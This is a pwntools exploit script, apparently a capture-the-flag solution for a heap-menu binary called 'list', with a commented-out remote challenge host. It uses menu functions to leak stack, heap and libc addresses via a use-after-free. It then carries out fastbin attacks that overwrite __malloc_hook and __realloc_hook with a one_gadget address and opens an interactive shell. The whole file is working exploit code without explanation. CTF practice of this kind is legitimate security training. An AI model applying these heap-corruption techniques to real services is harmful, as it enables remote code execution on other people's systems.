from pwn import *
#context.log_level="debug"
def cmd(cmd):
	p.readuntil("Exit\n")
	p.sendline(str(cmd))
def example():
	cmd(6)
def show():
	cmd(1)
	sleep(0.1)
def remove(index):
	cmd(4)
	p.readuntil("emove?\n")
	p.sendline(str(index))
def edit(index,c):
	cmd(5)
	p.readuntil("edit?\n")
	p.sendline(str(index))
	p.readuntil("name: \n")
	p.sendline(c)
def add_empty(num,size=1):
	cmd(3)
	p.readuntil("Large\n")
	p.sendline(str(size))
	p.readuntil("to add?\n")
	p.sendline(str(num))
def fast_bin_atk():
	add_empty(3)
	remove(1)
	payload="A"*0x18+p64(0x21)+p64(0x7fffffffdd00)+"\0"*0x10+p64(0x20)
	edit(0,payload)
	add_empty(2)
p=process("./list")
#p=remote("chal.noxale.com",1232)
libc=ELF("./libc.so.6")
example()
show()
p.readuntil("0. ")
data=p.readline()
stack=u64(data[:-1].ljust(8,'\0'))-(0x7fffffffdd3b-0x00007ffffffde000)+0x20
gdb.attach(p)
log.info(hex(stack))
remove(0)
#stack leak over #
add_empty(2)
remove(1)
remove(0)
add_empty(1)
show()
p.readuntil("0. ")
data=p.readline()
heap=u64(data[:-1].ljust(8,'\0'))-(0x0000555555758440-0x0000555555757000)
log.info(hex(heap))
remove(0)
#heap leak over #
#do uaf to leak libc & pie#
#aim 0x7fffffffdd20-0x00007ffffffde000
fast_bin_atk()
show()
p.readuntil("3. ")
data=p.readline()
log.success("baseaddress:---------->%s",hex(u64(data[:-1].ljust(8,'\0'))))
base=u64(data[:-1].ljust(8,'\0'))-(0x00007ffff7a2d830-0x00007ffff7a0d000)
one_gadget=0x4526a+base
libc.address=base
#libc leak over#
mhook=libc.symbols['__malloc_hook']
rehook=libc.symbols['__realloc_hook']
log.success("mhook:---------->%s",hex(mhook))
log.success("rehook:---------->%s",hex(rehook))
add_empty(3,3)
remove(5)
payload="A"*0x68+p64(0x71)+p64(mhook-0x23)
edit(4,payload)
add_empty(2,3)
log.info(hex(libc.symbols['__libc_realloc']))
payload="A"*(0x13-0x8)+p64(one_gadget)+p64(libc.symbols['__libc_realloc']+0x10)
edit(7,payload)
add_empty(1,1)
p.interactive()
